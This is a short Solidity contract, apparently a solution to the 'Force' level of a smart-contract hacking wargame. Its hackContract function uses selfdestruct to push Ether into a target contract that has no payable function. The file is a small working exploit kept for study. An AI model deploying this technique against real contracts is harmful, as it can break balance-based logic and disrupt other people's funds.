// SPDX-License-Identifier: MIT
pragma solidity ^0.8.9;
import "./Force.sol";

contract AttackingForce {
    address public contractAddress;

    constructor(address _contractAddress) payable {
        contractAddress = _contractAddress;
    }
    //send funds with payable to the address
    //self destruct will allow us to send money without invoking fallback on another function
    function hackContract() external {
        address payable addr = payable(address(contractAddress));
        selfdestruct(addr);
    }
}
